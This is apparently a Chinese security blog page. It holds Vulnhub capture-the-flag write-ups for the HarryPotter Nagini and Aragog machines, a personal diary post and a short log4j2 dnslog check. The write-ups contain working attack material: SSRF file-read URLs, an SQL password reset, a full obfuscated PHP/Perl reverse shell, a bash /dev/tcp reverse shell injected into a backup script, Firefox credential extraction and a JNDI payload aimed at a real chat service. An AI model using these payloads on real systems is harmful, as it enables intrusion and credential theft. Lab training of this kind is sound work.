<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Harrypotter-Na/2.png" alt="image-"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Harrypotter-Na/3.png" alt="image-"></p>
<p>2.再进行端口扫描，发现只开放了22和80端口，访问首页只有一张图片：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -A -p- 192.168.56.105，端口扫描</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Harrypotter-Na/4.png" alt="image-"></p>
<p><img src="/2022/08/08/Harrypotter-Na/5.png" alt="image-"></p>
<p>3.最后再进行一下目录扫描，发现一个note.txt，可以去看看：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.105 -x html,txt,php,bak --wordlist=/usr/share/wordlists/dirb/common.txt，目录扫描</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Harrypotter-Na/6.png" alt="image-"></p>
</blockquote>
<h3><span id="ssrf漏洞利用">SSRF漏洞利用</span></h3><blockquote>
<p>1.直接访问192.168.56.105&#x2F;note.txt，发现页面提示要使用http3，需要使用curl配置http3，把quic.nagini.hogwarts加入host，利用curl获取网页内容（curl配置http3见：<a target="_blank" rel="noopener" href="https://github.com/curl/curl/blob/master/docs/HTTP3.md%EF%BC%8C%E9%85%8D%E7%BD%AE%E5%A5%BD%E5%90%8E%E6%97%A0%E6%B3%95%E9%93%BE%E6%8E%A5%E5%8F%AF%E4%BB%A5%E5%B0%86kali%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E6%9A%82%E6%97%B6%E6%8D%A2%E4%B8%BANAT%EF%BC%89%EF%BC%9A">https://github.com/curl/curl/blob/master/docs/HTTP3.md，配置好后无法链接可以将kali的网络配置暂时换为NAT）：</a></p>
<p><img src="/2022/08/08/Harrypotter-Na/7.png" alt="image-"></p>
<p><img src="/2022/08/08/Harrypotter-Na/8.png" alt="image-"></p>
<p><img src="/2022/08/08/Harrypotter-Na/9.png" alt="image-"></p>
<p>2.在用http3协议访问之后，我们根据提示可以去看internalResourceFeTcher.php这个文件，发现是一个可以利用的SSRF：</p>
<p><img src="/2022/08/08/Harrypotter-Na/10.png" alt="image-"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &#x27;http://quic.nagini.hogwarts/internalResourceFeTcher.php?url=file:///etc/passwd&#x27;，可以获取/etc/passwd目录下的内容</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Harrypotter-Na/11.png" alt="image-"></p>
</blockquote>
<h3><span id="数据库修改登录">数据库修改登录</span></h3><blockquote>
<p>1.我们可以利用cms的特性扫描joomla数据库所在目录，可以发现配置文件configuration.php，而这个配置文件告知了我们joomla库下一个无密码用户goblin：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &#x27;http://quic.nagini.hogwarts/internalResourceFeTcher.php?url=file:///var/www/html/joomla/configuration.php&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Harrypotter-Na/12.png" alt="image-"></p>
<p>2.接下来我们要使用Gopherus这个工具生成payload，进行sql注入类的操作，需要使用pip2：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/pip/2.7/get-pip.py</span><br><span class="line">python2 get-pip.py</span><br><span class="line">pip2 -V</span><br></pre></td></tr></table></figure>

<p>3.将Gopherus生成的payload拼接到<a target="_blank" rel="noopener" href="http://192.168.56.105/internalResourceFeTcher.php?url=%E5%90%8E%E9%9D%A2%EF%BC%8C%E6%88%91%E4%BB%AC%E5%B7%B2%E7%BB%8F%E7%9F%A5%E9%81%93goblin%E6%98%AF%E6%97%A0%E5%AF%86%E7%A0%81%E7%94%A8%E6%88%B7%EF%BC%8C%E5%88%99%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BD%BF%E7%94%A8update%E5%91%BD%E4%BB%A4%E6%8A%8A%E6%96%B0%E5%AF%86%E7%A0%81%E5%8A%A0%E7%BB%99%E6%96%B0%E5%8A%A0%E5%85%A5%E7%9A%84%E7%94%A8%E6%88%B7%EF%BC%9A">http://192.168.56.105/internalResourceFeTcher.php?url=后面，我们已经知道goblin是无密码用户，则我们可使用update命令把新密码加给新加入的用户：</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">USE joomla; </span><br><span class="line">UPDATE joomla_users SET password=‘5f4dcc3b5aa765d61d8327deb882cf99’ </span><br><span class="line">WHERE email=‘site_admin@nagini.hogwarts’;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Harrypotter-Na/13.png" alt="image-"></p>
<p>4.现在可以使用site_admin用户，密码password登录&#x2F;joomla&#x2F;administrator：</p>
<p><img src="/2022/08/08/Harrypotter-Na/14.png" alt="image-"></p>
</blockquote>
<h3><span id="后台写入脚本getshell">后台写入脚本，getshell</span></h3><blockquote>
<p>1.在后台Extensions栏Templates页，选择Protostar，选择newfile，创建一个php文件，php反弹代码如下：</p>
<p><img src="/2022/08/08/Harrypotter-Na/15.png" alt="image-"></p>
<p><img src="/2022/08/08/Harrypotter-Na/16.png" alt="image-"></p>
<p><img src="/2022/08/08/Harrypotter-Na/17.png" alt="image-"><br>php&#96;&#96;&#96;<br><?php
function which($pr) {
$path = execute("which $pr");
return ($path ? $path : $pr);
}
function execute($cfe) {
$res = '';
if ($cfe) {
if(function_exists('exec')) {
@exec($cfe,$res);
$res = join("\n",$res);
} elseif(function_exists('shell_exec')) {
$res = @shell_exec($cfe);
} elseif(function_exists('system')) {
@ob_start();
@system($cfe);
$res = @ob_get_contents();
@ob_end_clean();
} elseif(function_exists('passthru')) {
@ob_start();
@passthru($cfe);
$res = @ob_get_contents();
@ob_end_clean();
} elseif(@is_resource($f = @popen($cfe,"r"))) {
$res = '';
while(!@feof($f)) {
$res .= @fread($f,1024);
}
@pclose($f);
}
}
return $res;
}
function cf($fname,$text){
if($fp=@fopen($fname,'w')) {
@fputs($fp,@base64_decode($text));
@fclose($fp);
}
}
$yourip = "192.168.56.105 ";
$yourport = '1234';
$usedb = array('perl'=>'perl','c'=>'c');
$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj".
"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR".
"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT".
"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI".
"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi".
"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl".
"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
cf('/tmp/.bc',$back_connect);
$res = execute(which('perl')." /tmp/.bc $yourip $yourport &");
?></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;</span><br><span class="line">&gt; 2.开启kali的对应端口监听，访问http://192.168.56.105/joomla/templates/protostar/rev.php，成功getshell，再利用python简历交互式shell：</span><br></pre></td></tr></table></figure>
<blockquote>
<p>nc -lvnp 1234<br>python3 -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">![image-](18.png)</span><br><span class="line"></span><br><span class="line">### SSH登录，准备提权</span><br><span class="line">1.首先在/var/www/html目录下有第一个flag，即horcrux1.txt，进行base64解密：</span><br><span class="line"></span><br><span class="line">![image-](19.png)</span><br><span class="line"></span><br><span class="line">2.然后在/home/hermoine目录下有第二个flag，即horcrux2.txt，但我们没有权限查看:</span><br><span class="line"></span><br><span class="line">![image-](20.png)</span><br><span class="line"></span><br><span class="line">![image-](21.png)</span><br><span class="line"></span><br><span class="line">3.继续查看/home/snape目录，此目录下有一个.creds.txt文件，有一段base64编码，很可能就是snape用户ssh登录的密码：</span><br><span class="line"></span><br><span class="line">![image-](22.png)</span><br><span class="line"></span><br><span class="line">![image-](23.png)</span><br><span class="line"></span><br><span class="line">4.登录snape后，我们可以将我们kali的ssh-keygen复制到snape的/home/hermoine目录下，并命名为authorized_keys，赋予权限，利用本就在hermoine目录下的su_cp执行，从而在kali上可以不使用密码ssh登录hermoine：</span><br></pre></td></tr></table></figure>
<p>find &#x2F; -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![image-](24.png)</span><br></pre></td></tr></table></figure>
<p>Kali：<br>ssh-keygen<br>cat ~&#x2F;.ssh&#x2F;id_rsa.pub</p>
<p>snape:<br>vim &#x2F;home&#x2F;snape&#x2F;authorized_keys<br>chmod 640 authorized_keys</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![image-](25.png)</span><br></pre></td></tr></table></figure>
<p>cd &#x2F;home&#x2F;hermoine&#x2F;bin<br>.&#x2F;su_cp -p &#x2F;home&#x2F;snape&#x2F;authorized_keys &#x2F;home&#x2F;hermoine&#x2F;.ssh&#x2F;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![image-](26.png)</span><br></pre></td></tr></table></figure>
<p>Kali:<br>ssh <a href="mailto:&#x68;&#101;&#114;&#x6d;&#111;&#x69;&#x6e;&#101;&#64;&#x31;&#57;&#x32;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#x35;&#54;&#46;&#x31;&#x30;&#53;">&#x68;&#101;&#114;&#x6d;&#111;&#x69;&#x6e;&#101;&#64;&#x31;&#57;&#x32;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#x35;&#54;&#46;&#x31;&#x30;&#53;</a> -i .ssh&#x2F;id_rsa</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">5.这个时候我们就可以去/root目录下查看horcrux2.txt这个文件，同样是用base64解密： </span><br><span class="line">![image-](27.png)</span><br><span class="line"></span><br><span class="line">### root提权</span><br><span class="line">1.我们可以在.mozilla/firefox/g2mhbq0o.default/目录下发现浏览器的登录信息，则考虑使用读取浏览器用户名和密码的工具firepwd，在hermoine开启一个http服务，传输要解密的文件给kali，可以爆出root的密码：</span><br></pre></td></tr></table></figure>
<p>hermoine:<br>cd .mozilla&#x2F;firefox&#x2F;g2mhbq0o.default&#x2F;<br>ls -al</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![image-](28.png)</span><br></pre></td></tr></table></figure>
<p>python3 -m http.server 9000<br>    Kali:<br>    unzip firepwd-master.zip，把firepwd下载到kali解压<br>cd firepwd-master<br>sudo pip install -r requirements.txt<br>pip3 install pycrypto<br>pip3 install pycryptodome<br>mkdir creds<br>cd creds<br>cp ~&#x2F;Desktop&#x2F;firepwd-master&#x2F;firepwd.py ~&#x2F;Desktop&#x2F;firepwd-master&#x2F;creds<br>wget <a target="_blank" rel="noopener" href="http://192.168.56.105:9000//logins.json">http://192.168.56.105:9000//logins.json</a><br>wget <a target="_blank" rel="noopener" href="http://192.168.56.105:9000//key4.db">http://192.168.56.105:9000//key4.db</a><br>python3 firepwd.py</p>
</blockquote>
<p>&#96;&#96;&#96;</p>
<blockquote>
<p><img src="/2022/08/08/Harrypotter-Na/29.png" alt="image-"></p>
<p>2.进行root登录，在&#x2F;home目录下能找到最后一个flag，即horcrux3.txt：<br><img src="/2022/08/08/Harrypotter-Na/30.png" alt="image-"></p>
<p><img src="/2022/08/08/Harrypotter-Na/31.png" alt="image-"></p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Hogwarts/" rel="tag">Hogwarts</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2022/08/08/Harrypotter-Ar/">
                Harrypotter Aragog
            </a>
        </h2>
    
    <time>
        Aug 8, 2022
    </time>
    <section class="content">
        <h1><span id="harrypotteraragog">HarryPotter:Aragog</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
<h4><span id="名称harrypotteraragog">名称：HarryPotter:Aragog</span></h4><h4><span id="发布日期2021510">发布日期：2021.5.10</span></h4><h4><span id="作者mansoor-r">作者：Mansoor R</span></h4><h4><span id="系列harrypotter">系列：HarryPotter</span></h4><h4><span id="推特time4ster">推特：@time4ster</span></h4></blockquote>
<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
<h4><span id="flags">Flags：</span></h4><p>www-data:&#x2F;home&#x2F;hagrid98&#x2F;horcrux1.txt<br>root:&#x2F;root&#x2F;horcrux2.txt</p>
<h4><span id="难度简单">难度：简单</span></h4></blockquote>
<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
<h4><span id="文件名aragog-102ova">文件名：Aragog-1.0.2.ova</span></h4><h4><span id="文件大小705mb">文件大小：705MB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimageharrypotteraragog-102ova">下载地址：</span></h4><h4><span id="md5-48a8bd22b27945a9a6fbcf6c57150162">MD5: 48A8BD22B27945A9A6FBCF6C57150162</span></h4><h4><span id="sha1-da8b34ead85c1f6ab66a907a6ba94f6b8284bcf7">SHA1: DA8B34EAD85C1F6AB66A907A6BA94F6B8284BCF7</span></h4></blockquote>
<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
<p>1.将靶机Aragog和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
<p><img src="/2022/08/08/Harrypotter-Ar/1.png" alt="image-"></p>
</blockquote>
<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Harrypotter-Ar/2.png" alt="image-"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Harrypotter-Ar/3.png" alt="image-"></p>
<p>2.再进行端口扫描，发现只开放了22和80端口，访问首页只有一张图片：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.104 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Harrypotter-Ar/4.png" alt="image-"></p>
<p><img src="/2022/08/08/Harrypotter-Ar/5.png" alt="image-"></p>
<p>3.最后再进行一下目录扫描，发现一个blog目录，可以去看看：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.56.104，目录扫描</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Harrypotter-Ar/6.png" alt="image-"></p>
</blockquote>
<h3><span id="wpscan漏洞发现">wpscan漏洞发现</span></h3><blockquote>
<p>1.直接访问192.168.56.104&#x2F;blog，发现页面提示是使用WordPress搭建的blog，想访问Notice等页面的内容和使用wpscan进行扫描，要添加一下host：</p>
<p><img src="/2022/08/08/Harrypotter-Ar/7.png" alt="image-"></p>
<p><img src="/2022/08/08/Harrypotter-Ar/8.png" alt="image-"></p>
<p>2.再利用wpscan扫描得到漏洞，–pluguns-detection aggressive模式下有几个漏洞，都是有关file manager的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordpress.aragog.hogwarts/blog --plugins-detection aggressive</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Harrypotter-Ar/9.png" alt="image-"></p>
</blockquote>
<h3><span id="msf-getshell">msf getshell</span></h3><blockquote>
<p>1.我们可以利用msf查找可用的file manager利用工具，配置后进行shell：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search file manager wordpress，查看相关漏洞利用工具</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Harrypotter-Ar/10.png" alt="image-"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exploit/multi/http/wp_file_manager_rce -y，漏洞工具选择</span><br><span class="line">set TARGETURI /blog，配置URI</span><br><span class="line">set RHOSTS wordpress.aragog.hogwarts，配置远程地址</span><br><span class="line">set LHOST 192.168.56.102，配置本地地址</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Harrypotter-Ar/11.png" alt="image-"></p>
<p>2.再利用python，获取一个ttyshell，查询目录，在&#x2F;home&#x2F;hagrid98下能找到第一个flag，horcrux1.txt：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python3 -c ‘import pty; pty.spawn(“/bin/bash”);’</span><br><span class="line">cat /home/hagrid98/horcrux1.txt</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Harrypotter-Ar/12.png" alt="image-"></p>
<p><img src="/2022/08/08/Harrypotter-Ar/13.png" alt="image-"></p>
</blockquote>
<h3><span id="mysql登录进行提权">mysql登录，进行提权</span></h3><blockquote>
<p>1.在&#x2F;etc&#x2F;wordpress目录下的config-defaut.php文件内能看到一个数据库密码，登录mysql后进入wordpress数据库查询wp_users表能够得到hagrid98的ssh登录密码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/wordpress/config-default.php，得到root数据库密码</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Harrypotter-Ar/14.png" alt="image-"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p，登录mysql，密码为mySecr3tPass</span><br><span class="line">use wordpress;</span><br><span class="line">select * from wp_users;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Harrypotter-Ar/15.png" alt="image-"></p>
<p><img src="/2022/08/08/Harrypotter-Ar/16.png" alt="image-"></p>
<p>2.进行ssh登录hagrid98，查找备份文件可以发现一个脚本：</p>
<p><img src="/2022/08/08/Harrypotter-Ar/17.png" alt="image-"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;*back*&quot;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Harrypotter-Ar/18.png" alt="image-"></p>
<p>3.在这里我们简单弹个shell，因为&#x2F;opt&#x2F;.backup.sh是被修改过的，我们也有权利进行修改：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.56.102/5555 0&gt;&amp;1&#x27;&quot; &gt;&gt; /opt/.backup.sh</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Harrypotter-Ar/19.png" alt="image-"></p>
<p>4.从.backup.sh的文件内容看，&#x2F;tmp目录是可以进行拷贝等操作的，我们可以尝试把文件拷贝到&#x2F;tmp目录下执行，同时kali监听5555端口，并且网页访问&#x2F;tmp&#x2F;tmp_wp_uploads目录：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 5555，kali监听</span><br><span class="line">cp /opt/.backup.sh /tmp/.backup.sh</span><br><span class="line">cd /tmp</span><br><span class="line">./.backup.sh</span><br></pre></td></tr></table></figure>

<p>5.在root用户的&#x2F;root目录下能发现第二个flag，即horcrux2.txt：</p>
<p><img src="/2022/08/08/Harrypotter-Ar/20.png" alt="image-"></p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Harrypotter/" rel="tag">Harrypotter</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2022/08/04/blue-horizon/">
                蓝色的地平线
            </a>
        </h2>
    
    <time>
        Aug 4, 2022
    </time>
    <section class="content">
        <h1><span id="蓝色的地平线">蓝色的地平线</span></h1><p><img src="/2022/08/04/blue-horizon/1.jpg" alt="image"></p>
<p>别问我为什么一个月多都没写博客感觉是面试通过了门面撑好了博客就不需要更新了(￣ε(#￣)☆╰╮o(￣皿￣&#x2F;&#x2F;&#x2F;)</p>
<p>其实不然<del>（借口）</del>，主要是“搬家 + 居家隔离 + 天天核酸”的套餐搞得自己没有太多精力去把技术类的东西再搬过来……<del>你想让我说因为放了几个月假没上班最后能有几天就一直在玩 Monster Hunter Rise：Sunbreak吗？！</del></p>
<p>所以嘛，到了现在我已经上了三个星期的班了，新工作环境还不错，但也多少有点压力，不过还好，至少现在我还能有时间在公司码几篇博客传上来，希望之后也有这样的时间来学习一些东西。</p>
<p>现在工作上接触到漏洞的发现、验证、利用场景比较多，之后应该会多更新整合这方面的学习内容；还会接收到很多SRC过来的漏洞，也会学习学习手法（但大多都比较简单应该不会碎片化记录，整合下可能性微存？<del>懒</del>）</p>
<p>欸，又回到这种每天白开水预设的生活了，该说要每天能给自己掺点有意思的东西比较好（于是就发生了快凌晨2点被提生产环境上线复测漏洞的情况）</p>
<p><img src="/2022/08/04/blue-horizon/2.jpg" alt="image" title="差不多得了"></p>
<p>「不要被他人所命令所急迫，自己要有自己的度量」</p>
<p>话说今天是七夕欸，V我50(<em>´◐∀◐&#96;</em>)</p>
<p>这篇文章叫“蓝色的地平线”（ブルー・ホライズン），是因为在写完这篇时，刚好随机到《记录的地平线》第三季ED，名为《ブルー・ホライズン》<del>（天国的第四季）</del>。</p>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Chaos/" rel="tag">Chaos</a><a class="tag-none-link" href="/tags/New-Start/" rel="tag">New Start</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2022/08/03/dnslog-log4j2/">
                dnslog-log4j2
            </a>
        </h2>
    
    <time>
        Aug 3, 2022
    </time>
    <section class="content">
        <h1><span id="dnslog简单验证log4j2漏洞">dnslog简单验证log4j2漏洞</span></h1><blockquote>
<p>本文转自<a target="_blank" rel="noopener" href="https://xingye.me/?p=444">星夜</a></p>
</blockquote>
<h2><span id="简单步骤">简单步骤</span></h2><blockquote>
<p>进dnslog：<a target="_blank" rel="noopener" href="http://www.dnslog.cn/">http://www.dnslog.cn/</a></p>
<p>Get SubDomain 得到一个随机的子域名</p>
<p>拼进${jndi:ldap:&#x2F;&#x2F;xxxxx.dnslog.cn&#x2F;exp}</p>
<p>往任意可能在log中塞的输入填</p>
<p>这里拿tx玩，如群中发送，可得到tx云的记录</p>
<p><img src="/2022/08/03/dnslog-log4j2/1.png" alt="image"></p>
<p><img src="/2022/08/03/dnslog-log4j2/2.png" alt="image"></p>
<p><img src="/2022/08/03/dnslog-log4j2/3.png" alt="image"></p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
            </div>
        

    </section>
</article>
  
</section>


  <nav id="page-nav" class="clearfix">
    
    <a class="prev" rel="prev" href="/page/9/">
      <span class="icon icon-chevron-left"></span>
      <span class="text">Previous</span>
    </a>
    
    
    <a class="next" rel="next" href="/page/11/">
      <span class="text">Next</span>
      <span class="icon icon-chevron-right"></span>
    </a>
    
  </nav>

        <script>setLoadingBarProgress(60);</script>
    </main>

    <footer id="footer" class="clearfix">

    

    <div class="social-wrapper">
        
            
                <a href="https://github.com/artchen" class="social github"
                   target="_blank" rel="external">
                    <span class="icon icon-github"></span>
                </a>
            
                <a href="/atom.xml" class="social rss"
                   target="_blank" rel="external">
                    <span class="icon icon-rss"></span>
                </a>
            
        
    </div>

    <div class="theme-by">Theme <span class="codename">Memory</span> designed by <a href="https://artifact.me/"
                                                                                    target="_blank">Art Chen</a>.
    </div>
    <div>&copy; <a href="/">氕氘氚</a></div>

</footer>


    <script>setLoadingBarProgress(80);</script>
    <div class="overlay"></div>
</div>

<div class="site-sidebar" id="site-sidebar">

    

    <div class="sidebar-switch clearfix "
         style="display: none">
        <a class="dark-btn active" data-toggle="toc">
            <span class="icon icon-list"></span>
            <span class="text">Index</span>
        </a>
        <a class="dark-btn" data-toggle="bio">
            <span class="icon icon-person"></span>
            <span class="text">Bio</span>
        </a>
    </div>

    <div class="site-toc "
         style="display: none">
        
            <div class="no-index">No Index</div>
        
    </div>

    <div class="site-bio show"
         style="display: block">

        <div class="about-me clearfix">
            <div class="avatar">
                <img src="/img/avatar.png"/>
            </div>
            <div class="info">
                <a class="name dark-btn" href="/about">
                    Szczecin
                </a>
            </div>
            <div class="info">
                <span class="item desc">
                    Open your eyes to see the light in life
                </span>
            </div>
        </div>

        <div class="menu section">
            <ul class="clearfix">
                
                    <li class="left">
                        <a href="/about"
                           onfocus="this.blur();"
                           class="nav-about dark-btn block">
                            简介
                        </a>
                    </li>
                
                    <li class="right">
                        <a href="/archives"
                           onfocus="this.blur();"
                           class="nav-archives dark-btn block">
                            归档
                        </a>
                    </li>
                
                    <li class="left">
                        <a href="/categories"
                           onfocus="this.blur();"
                           class="nav-categories dark-btn block">
                            分类
                        </a>
                    </li>
                
                    <li class="right">
                        <a href="/tags"
                           onfocus="this.blur();"
                           class="nav-tags dark-btn block">
                            TAGs
                        </a>
                    </li>
                
                    <li class="left">
                        <a href="/WriteUP"
